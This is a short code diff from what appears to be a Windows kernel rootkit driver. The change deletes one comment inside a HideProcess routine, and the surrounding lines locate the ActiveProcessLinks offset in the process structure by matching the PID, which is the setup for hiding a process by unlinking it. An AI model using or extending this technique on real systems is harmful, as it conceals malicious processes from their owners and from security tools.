@@ -86,7 +86,6 @@ NTSTATUS HideProcess(PDEVICE_OBJECT pDeviceObj, PIRP irp) // pointer to device o
 		if(ptr[i] == *((PULONG)buffer))
 		{
 			offset = (ULONG)&ptr[i + 1] - (ULONG)Process; // ActiveProcessLinks is located next to the PID
-			// after it will work try the next:
 			CurrListEntry = (PLIST_ENTRY)((PUCHAR)&ptr[i + 1]); //(PUCHAR)Process + (ULONG)&ptr[i + 1] - (ULONG)Process
 			DbgPrint("ActiveProcessLinks offset: %#x", offset);
 			break;
